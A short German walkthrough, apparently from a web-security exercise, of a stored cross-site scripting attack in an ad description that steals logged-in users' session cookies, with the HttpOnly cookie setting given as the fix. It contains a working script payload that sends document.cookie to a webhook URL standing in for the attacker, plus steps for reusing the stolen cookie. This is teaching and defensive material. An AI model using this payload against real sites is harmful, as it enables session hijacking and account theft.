Payload in XSS anf채llige Beschreibung einer Anzeige schreiben. Die Beschreibung kann nur von angemeldeten Benutzer:innen eingesehen werden, deren Cookie man stehlen will.
"https://webhook.site/random-webhook-id" steht hier stellvertretend f체r die Domain vom attacker.
<script>document.write(`<img src='https://webhook.site/random-webhook-id?c=${document.cookie}'></img>`)</script>

Cookies des Opfers abfangen

Cookie f체r eigene Anfragen nutzen.
Im Browser Dev Tools > Web-Speicher zum manuellen Setzen von Cookie Werten.

Zum Schutz vor diesem Angriff muss der Cookie auf HttpOnly gesetzt werden, damit Javascript Code keinen Zugriff mehr auf ihn hat.
In application.properties hinzuf체gen:
server.servlet.session.cookie.http-only=true